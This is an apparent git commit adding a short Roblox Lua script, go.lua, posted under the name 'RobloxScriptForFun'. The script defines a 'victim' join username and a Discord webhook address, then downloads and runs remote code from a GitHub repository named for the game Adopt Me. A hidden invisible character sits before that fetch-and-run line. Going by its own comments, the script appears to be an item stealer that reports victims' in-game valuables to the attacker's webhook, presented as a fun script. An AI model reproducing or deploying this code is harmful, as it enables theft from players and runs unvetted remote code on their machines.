253479f572b4d2f126cdf17c831d0514c9e5a503
RobloxScriptForFun <bringasbrian500@gmail.com>
2025-04-17 12:19:39 +0800

    Create go.lua

---
+++ go.lua
@@ -0,0 +1,6 @@
+_G.Username = "TheStrongestNinja00" -- user you should join victim on
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1301973410116669471/dL5wxTRE20qpfs1Pkd8WvQ0Fxq5zH98mOY1sgUY3WO7WkutAYsRUeUKYcKxd4Z907Kix" -- change to your webhook
+
+‎loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScriptForFun/Adopt-Me-Script/refs/heads/main/Adm.lua"))()
